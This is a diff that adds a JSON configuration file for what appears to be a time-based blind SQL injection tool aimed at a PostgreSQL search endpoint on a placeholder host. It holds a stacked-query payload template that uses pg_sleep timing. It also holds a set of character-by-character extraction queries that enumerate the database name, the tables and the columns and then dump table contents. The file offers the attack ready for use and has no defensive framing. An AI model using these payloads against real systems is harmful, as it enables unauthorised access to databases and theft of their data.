@@ -1,0 +1,19 @@
+{
+    "target_url": "http://example.com/api/v1/search",
+    "method": "POST",
+    "target_param": "query",
+    "injection_type": "time",
+    "time_threshold": 3.0,
+    "success_keyword": "Welcome",
+    "payload_template": "1'; SELECT CASE WHEN ({query}) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
+    "queries": {
+      "get_db": "ascii(substr((SELECT current_database()), {pos}, 1)) = {ascii_val}",
+      "get_tables": "ascii(substr((SELECT tablename FROM pg_tables WHERE schemaname='public' OFFSET {offset} LIMIT 1), {pos}, 1)) = {ascii_val}",
+      "get_columns": "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' OFFSET {offset} LIMIT 1), {pos}, 1)) = {ascii_val}",
+      "dump_data": "ascii(substr((SELECT {column}::text FROM {table} OFFSET {offset} LIMIT 1), {pos}, 1)) = {ascii_val}"
+    },
+    "headers": {
+      "User-Agent": "Mozilla/5.0",
+      "Content-Type": "application/json"
+    }
+  }
